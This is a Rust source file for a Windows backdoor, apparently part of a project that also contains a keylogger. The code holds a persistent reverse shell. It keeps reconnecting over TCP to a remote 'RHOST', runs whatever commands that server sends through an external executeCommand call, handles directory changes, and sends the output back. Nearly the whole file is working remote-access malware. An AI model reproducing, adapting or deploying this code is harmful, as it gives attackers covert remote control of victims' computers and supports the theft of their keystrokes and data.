#[cfg(target_os = "windows")]
use std::{net::{TcpStream, Shutdown}, thread, io::{Read, Write}, path::Path, env};
use std::sync::{Arc, Mutex};

use flealib::keylogger::Keylogger;
#[cfg(target_os = "windows")]
use log::debug;

pub struct Backdoor
{
}

impl Backdoor
{
    pub fn new() -> Backdoor
    {
        Backdoor
        {
        }
    }

    /// Change a directory to one level up
    /// # Returns
    /// * `Result<(), String>` - Result of the operation
    #[cfg(target_os = "windows")]
    pub fn change_directory_up(&self) -> Result<(), String>
    {
        let binding = env::current_dir().unwrap();
        let current_dir = Path::new(binding.to_str().unwrap());
        match current_dir.parent()
        {
            Some(x) =>
            {
                std::env::set_current_dir(x).unwrap();
            },
            None =>
            {
                return Err("Already at root".to_string())
            }
        };

        Ok(())
    }

    /// Change current directory to the new one
    /// # Arguments
    /// * 'folder' - New directory
    /// # Returns
    /// * `Result<(), String>` - Result of the operation
    #[cfg(target_os = "windows")]
    pub fn change_directory(&self, folder: &str) -> Result<(), String>
    {
        match std::env::set_current_dir(folder)
        {
            Ok(_) =>
            {
                Ok(())
            },
            Err(_) =>
            {
                Err("Directory not found".to_string())
            }
        }
    }

    /// This function will execute the command and return the result
    /// # Arguments
    /// * `buffer` - The command to execute
    /// # Returns
    /// The result of the command
    /// # Safety
    /// This function is unsafe because it calls an external function
    #[cfg(target_os = "windows")]
    fn shell(&self, buffer: &String) -> String
    {
        use std::ffi::{c_char, CStr, CString};

        debug!("Executing command: {}", buffer);

        //check if this is a cd command
        let v: Vec<&str> = buffer.split("cd ").collect();

        if v.len() > 1
        {
            let dir = v[1].trim();
            if dir == ".."
            {
                match self.change_directory_up()
                {
                    Ok(_) => {return String::from("Directory changed one level up");},
                    Err(e) => { return e; }
                }
            }
            else
            {
                match self.change_directory(dir)
                {
                    Ok(_) => {return String::from("Directory changed to: ") + dir;},
                    Err(e) => { return e; }
                }
            }
        }

        extern {
            fn executeCommand(cmd: *const c_char) -> *const c_char;
        }

        let cmd = String::from(buffer);
        let cs = CString::new(cmd).unwrap();
        let ptr = cs.into_raw();
        let str_slice: String;

        unsafe { 
            let slice = CStr::from_ptr(executeCommand(ptr)); 
            str_slice = String::from_utf8_lossy(slice.to_bytes()).to_string();
        };

        let _cs = unsafe { CString::from_raw(ptr) };
        
        str_slice
    }

    /// This function will check if the user sent a special command
    /// # Arguments
    /// * `cmd` - The command to check
    /// # Returns
    /// True if the user sent a special command to close the program
    /// False if the user did not send a special command to close the program
    #[cfg(target_os = "windows")]
    fn run_special_cmd(&self, cmd: &String) -> bool
    {
        let mut quit = false;

        if cmd == "q"
        {
            quit = true;
        }

        quit
    }

    /// This function will read the data from the server and send the result back to the server
    /// This function will return true if the user sent a special command to close the program
    /// # Arguments
    /// * `stream` - The TcpStream object
    /// * `key_logger_data` - The keylogger data
    #[cfg(target_os = "windows")]
    fn process(&self, mut stream: TcpStream, key_logger_data: &Arc<Mutex<Keylogger>>) -> bool
    {
        const MAX_INPUT_BUFFER: usize = 1024;

        let mut quit = false;

        if stream.set_nonblocking(true).is_err()
        {
            error!("Failed to set non-blocking mode on the socket");
            return true;
        }   
        
        debug!("Connected to RHOST");

        loop 
        {
            let mut data = [0_u8; MAX_INPUT_BUFFER];
            let mut data_buffer = Vec::<u8>::new();

            let val = key_logger_data.lock().unwrap();
            if val.quit
            {
                quit = true;
                break;
            }

            drop(val);

            match stream.read(&mut data)
            {
                Ok(data_len) => 
                {
                    if data_len == 0 || data_len >= MAX_INPUT_BUFFER - 1
                    {
                        break;
                    }

                    data_buffer.extend_from_slice(&data[..data_len]);
                    let buffer = String::from_utf8_lossy(&data_buffer).to_string();
                    
                    if self.run_special_cmd(&buffer)
                    {
                        quit = true;
                        break;
                    }
                    
                    let ret = self.shell(&buffer);

                    if !ret.is_empty()
                    {
                        //send the result back to the server
                        let mut ret_buffer = Vec::<u8>::new();
                        ret_buffer.extend_from_slice(ret.as_bytes());

                        match stream.write_all(&ret_buffer)
                        {
                            Ok(_) => {},
                            Err(s) => 
                            {
                                error!("Error sending result back to the server: {}", s);
                                break;
                            }
                        }
                    }
                    else if stream.write("Ok".as_bytes()).is_err()
                    {
                        break;
                    }
                },
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => 
                {
                    thread::sleep(std::time::Duration::from_millis(100));
                },
                Err(_) => 
                {
                    error!("Error reading from server");
                    break;
                }
            }
        }
        
        stream.shutdown(Shutdown::Both).unwrap();        
        debug!("Disconnected from RHOST");
        quit
    }

    /// This function will try to connect to the server and if it fails it will wait for 3 seconds and try again
    /// If the connection is successful it will call the process function
    /// This function will return if user decided to close the proggram with a special command
    /// # Arguments
    /// * `address` - The address of the server
    /// * `key_logger_data` - The keylogger data
    #[cfg(target_os = "windows")]
    pub fn run(&self, address: &str, key_logger_data: Arc<Mutex<Keylogger>>)
    {
        const NEXT_CONNECTION_WAIT_TIME: u64 = 2000;

        debug!("Starting connection to RHOST: {}", address);

        loop 
        {
            let val = key_logger_data.lock().unwrap();
            if val.quit
            {
                break;
            }

            drop(val);

            match TcpStream::connect(address) 
            {
                Ok(stream) => 
                {
                    if self.process(stream, &key_logger_data)
                    {
                        break;
                    }
                },
                Err(_) => 
                {
                    thread::sleep(std::time::Duration::from_millis(NEXT_CONNECTION_WAIT_TIME));
                }
            }                
        }
    } 

    /// Currently there is no implementation for linux
    #[cfg(target_os = "linux")]
    pub fn run(&self, _address: &str, _key_logger_data: Arc<Mutex<Keylogger>>)
    {        
    }
}
